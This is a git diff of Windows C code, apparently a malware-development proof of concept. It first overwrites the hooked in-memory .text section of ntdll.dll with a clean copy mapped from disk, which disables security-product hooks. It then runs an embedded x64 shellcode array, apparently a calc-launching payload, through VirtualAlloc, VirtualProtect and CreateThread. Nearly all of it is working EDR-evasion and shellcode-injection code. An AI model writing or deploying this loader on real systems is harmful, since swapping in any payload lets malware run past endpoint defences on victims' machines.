@@ -3,57 +3,41 @@
 
 int main(){
 
-    LPCSTR lpFileName = "C:\\Windows\\System32\\ntdll.dll";
+    printf("############### Breakpoint ###############");
+    getchar();
     
-    PBYTE pNtdllUnhooked;
-    PVOID dwTextAddressUnhooked;
-    SIZE_T dwTextSizeUnhooked;
+	PVOID pSyscallAddress = GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtProtectVirtualMemory");
 
-    DWORD dwTextAddressHooked;
-    DWORD dwTextSizeHooked;
-    DWORD dwNtdllHookedSize;
-    PBYTE pNtdllHooked;
-    PVOID pAddressNtdllHooked;
+  	printf("[#] %s [ 0x%p ] ---> %s \n", "NtProtectVirtualMemory", pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");
 
-    PVOID pNtdllTxtHooked;
-    SIZE_T sNtdllTxtHooked;
-
-    printf("[*] Retrieving Buffer from Ntdll...\n");
-
-    if(!RetrieveBufferFileDisk(lpFileName, &pNtdllUnhooked)){
-        return -1;
-    }
-    
-    if(!GetTextSectionUnhooked((PBYTE)pNtdllUnhooked, &dwTextAddressUnhooked, &dwTextSizeUnhooked)){
-        return -1;
-    }
-    printf("\t[*] .text Address from Ntdll Unhooked: 0x%p\n", dwTextAddressUnhooked);
-    printf("\t[*] .text Size from Ntdll Unhooked: %zu bytes\n\n", dwTextSizeUnhooked);
-    
-    printf("[i] Fetching Base Address to NTDLL Hooked...");
-
-    FetchNtdllBaseAddresHooked(&pAddressNtdllHooked);
-    if(pAddressNtdllHooked == INVALID_HANDLE_VALUE){
-        return -1;
-    }
-    printf("DONE\n");
-
-    GetTextSectionHooked(pAddressNtdllHooked, &pNtdllTxtHooked, &sNtdllTxtHooked);
-
-    printf("\t[*] .text Address from Ntdll Hooked: 0x%p\n", pNtdllTxtHooked);
-    printf("\t[*] .text Size from Ntdll Hooked: %zu bytes\n\n", sNtdllTxtHooked);
-
-    if(ReplaceNtdll(pAddressNtdllHooked, sNtdllTxtHooked, dwTextAddressUnhooked)){
-        printf("Error: %lu", GetLastError());
+    PVOID pLocalText;
+    SIZE_T sLocalText;
+    if(!GetTextHooked(&pLocalText, &sLocalText)){
         return -1;
     }
 
-    printf("[+] Replaced Text in NTDLL...");
+    LPCSTR Ntdll = "C:\\Windows\\System32\\ntdll.dll";
+    PVOID pRemoteText;
+    SIZE_T sRemoteText;
+    if(!GetTextUnhooked(Ntdll, &pRemoteText, &sRemoteText)){
+        return -1;
+    }
 
-    return 0;
+    if(!ReplaceNtdllText(pLocalText, sLocalText, pRemoteText)){
+        return -1;    
+    }
+
+  	printf("[#] %s [ 0x%p ] ---> %s \n", "NtProtectVirtualMemory", pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");
+
+    if(!SimpleInjection()){
+        return -1;
+    }
+
 }
 
-BOOL RetrieveBufferFileDisk( _In_ LPCSTR ntdllName, _Out_ LPVOID* pNtdllImage) {
+BOOL GetTextUnhooked( _In_ LPCSTR ntdllName, _Out_ PVOID* pTextUnhooked, _Out_ SIZE_T* sTextUnhooked ) {
+
+    printf("[i] Start REMOTE Ntdll...\n");
 
     HANDLE hNtdll = CreateFileA(ntdllName, GENERIC_READ , FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hNtdll == INVALID_HANDLE_VALUE) {
@@ -68,55 +52,53 @@ BOOL RetrieveBufferFileDisk( _In_ LPCSTR ntdllName, _Out_ LPVOID* pNtdllImage) {
     if (hMapFile == NULL) {
         printf("\t[!] CreateFileMapping for ntdll unhooked failed with error: %lu\n", GetLastError());
         goto _CLEANUP;
-        return FALSE;
     }
 
-    *pNtdllImage = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
-    if (*pNtdllImage == NULL) {
-        printf("\t[!] MapViewOfFile for ntdll unhooked failed with error: %lu\n", GetLastError());
+    LPVOID pNtdllImage = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
+    if (pNtdllImage == NULL) {
+        printf("\t[!] MapViewOfFile for REMOTE ntdll failed with error: %lu\n", GetLastError());
         goto _CLEANUP;
-        return FALSE;
     }
-	printf("\t[*] Mapped Ntdll in memory at 0x%p\n", pNtdllImage);
-    return TRUE;
+	printf("\t[*] REMOTE Ntdll in memory at 0x%p\n", pNtdllImage);
 
+    PVOID ptextRemote;
+    SIZE_T stextRemote;
+
+    PIMAGE_DOS_HEADER pImageDosHdr = (PIMAGE_DOS_HEADER)pNtdllImage;
+    if (pImageDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
+        printf("\t[!] Invalid DOS Signature at unhooked ntdll\n");
+        goto _CLEANUP;
+    }
+
+    PIMAGE_NT_HEADERS pImageNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllImage + pImageDosHdr->e_lfanew);
+    
+    PIMAGE_SECTION_HEADER pImageSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImageNtHdrs) + sizeof(IMAGE_NT_HEADERS));
+
+    ptextRemote = (PVOID)(pImageNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pNtdllImage);
+    stextRemote = pImageNtHdrs->OptionalHeader.SizeOfCode;
+
+    printf("\t[+] REMOTE Ntdll Text base address: 0x%p\n", ptextRemote);
+    printf("\t[+] REMOTE Ntdll Text size: %d\n\n", stextRemote);
+
+    *pTextUnhooked = ptextRemote;
+    *sTextUnhooked = stextRemote;
+
+    goto _CLEANUP;
 
 _CLEANUP:
 	if (hNtdll)
 		CloseHandle(hNtdll);
     if (hMapFile)
 		CloseHandle(hMapFile);
-	if (*pNtdllImage == NULL)
+	if (pNtdllImage == NULL)
 		return FALSE;
 	else
 		return TRUE;
 }
 
-BOOL GetTextSectionUnhooked(_In_ PBYTE pPE, _Out_ PVOID* pTextAddressUnhooked, _Out_ SIZE_T* szTextSizeUnhooked){
+BOOL GetTextHooked( _Out_ PVOID* pTextHooked, _Out_ SIZE_T* sTextHooked){
 
-    PVOID textAddress;
-    SIZE_T textSize;
-
-    PIMAGE_DOS_HEADER pImageDosHdr = (PIMAGE_DOS_HEADER)pPE;
-    if (pImageDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
-        printf("[!] Invalid DOS Signature at unhooked ntdll");
-		return FALSE;
-    }
-
-    PIMAGE_NT_HEADERS pImageNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pPE + pImageDosHdr->e_lfanew);
-    
-    PIMAGE_SECTION_HEADER pImageSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImageNtHdrs) + sizeof(IMAGE_NT_HEADERS));
-
-    textAddress = (PVOID)(pImageNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pPE);
-    textSize = pImageNtHdrs->OptionalHeader.SizeOfCode;
-
-    *pTextAddressUnhooked = textAddress;
-    *szTextSizeUnhooked = textSize;
-
-    return TRUE;
-}
-
-BOOL FetchNtdllBaseAddresHooked(_Out_ PVOID* pDllBase){
+    printf("[i] Start LOCAL Ntdll...\n");
 
 #ifdef _WIN64
 	PPEB pPEB = (PPEB)__readgsqword(0x60);
@@ -126,31 +108,32 @@ BOOL FetchNtdllBaseAddresHooked(_Out_ PVOID* pDllBase){
 
 	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
 
-	*pDllBase = pLdr->DllBase;
+	PVOID pNtdllHooked = pLdr->DllBase;
     
-    return TRUE;
+    printf("\t[+] LOCAL Ntdll in memory at: 0x%p\n", pNtdllHooked);
 
-}
 
-BOOL GetTextSectionHooked(_In_ PVOID pLocalNtdll, _Out_ PVOID* pNtdllHookedTxt, _Out_ SIZE_T* sNtdllHookedTxtSz){
-    PIMAGE_DOS_HEADER	pLocalDosHdr	= (PIMAGE_DOS_HEADER)pLocalNtdll;
+        PIMAGE_DOS_HEADER	pLocalDosHdr	= (PIMAGE_DOS_HEADER)pNtdllHooked;
     if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
         return FALSE;
 
-    PIMAGE_NT_HEADERS 	pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
+    PIMAGE_NT_HEADERS 	pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pNtdllHooked + pLocalDosHdr->e_lfanew);
     if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) 
         return FALSE;
 
-    PVOID	pLocalNtdllTxt	= (PVOID)(pLocalNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pLocalNtdll);
+    PVOID	pLocalNtdllTxt	= (PVOID)(pLocalNtHdrs->OptionalHeader.BaseOfCode + (ULONG_PTR)pNtdllHooked);
     SIZE_T	sNtdllTxtSize	= pLocalNtHdrs->OptionalHeader.SizeOfCode;	
 
-    *pNtdllHookedTxt = pLocalNtdllTxt;
-    *sNtdllHookedTxtSz = sNtdllTxtSize;
+    printf("\t[+] LOCAL Ntdll Text base address: 0x%p\n", pLocalNtdllTxt);
+    printf("\t[+] LOCAL Ntdll Text size: %d\n\n", sNtdllTxtSize);
+
+    *pTextHooked = pLocalNtdllTxt;
+    *sTextHooked = sNtdllTxtSize;
 
     return TRUE;
 }
 
-BOOL ReplaceNtdll(IN PVOID pTextOriginalNtdll, SIZE_T sTextOriginalNtdll, IN PVOID pTextUnhookedNtdll){
+BOOL ReplaceNtdllText( _In_ PVOID pTextOriginalNtdll, _In_ SIZE_T sTextOriginalNtdll, _In_ PVOID pTextUnhookedNtdll){
 
     DWORD dwOldProtection;
 
@@ -161,10 +144,72 @@ BOOL ReplaceNtdll(IN PVOID pTextOriginalNtdll, SIZE_T sTextOriginalNtdll, IN PVO
 
 	memcpy(pTextOriginalNtdll, pTextUnhookedNtdll, sTextOriginalNtdll);
 	
+
 	if (!VirtualProtect(pTextOriginalNtdll, sTextOriginalNtdll, dwOldProtection, &dwOldProtection)) {
 		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
+
+    printf("[#] Replaced Ntdll Text...\n\n");
+
+    return TRUE;
+}
+
+BOOL SimpleInjection(){
+
+    printf("[+] Start Simple Injection...\n");
+
+    unsigned char shellcode[] = {
+        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+    };
+
+    PVOID pshell = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if(pshell == NULL){
+        printf("\t[!] VirtualAlloc in Simple Injection failed with code error: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    printf("\t[+] Memory allocated for simple injection at: 0x%p\n", pshell);
+
+    memcpy(pshell, (PBYTE)shellcode, sizeof(shellcode));
+
+    DWORD oldprotect;
+    if(!VirtualProtect(pshell, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldprotect)){
+        return FALSE;
+    }
+
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pshell, NULL, 0, NULL);
+    if(hThread == INVALID_HANDLE_VALUE){
+        printf("\t[!] Invalid handle in CreateThread\n");
+        return FALSE;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+
+    printf("\t[+] DONE\n");
 
     return TRUE;
 }
